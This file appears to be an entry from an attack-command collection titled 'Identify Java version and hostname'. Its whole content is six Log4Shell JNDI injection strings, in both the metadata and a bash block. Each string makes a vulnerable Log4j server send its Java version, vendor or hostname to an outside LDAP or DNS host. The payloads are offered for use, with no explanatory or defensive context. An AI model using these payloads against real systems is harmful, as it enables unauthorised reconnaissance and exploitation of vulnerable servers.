---
id: 3d665376-2bed-4fa5-a23c-bd8c5de485c7
name: Identify Java version and hostname
type: command
executor: bash
data: '${jndi:ldap://${java:version}.domain/a}

  ${jndi:ldap://${env:JAVA_VERSION}.domain/a}

  ${jndi:ldap://${sys:java.version}.domain/a}

  ${jndi:ldap://${sys:java.vendor}.domain/a}

  ${jndi:ldap://${hostName}.domain/a}

  ${jndi:dns://${hostName}.domain}

  '
output: null
created_at: '2023-04-06T03:55:56.850182+00:00'
updated_at: '2023-04-06T03:55:56.865775+00:00'
---

# Identify Java version and hostname

```bash
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

```


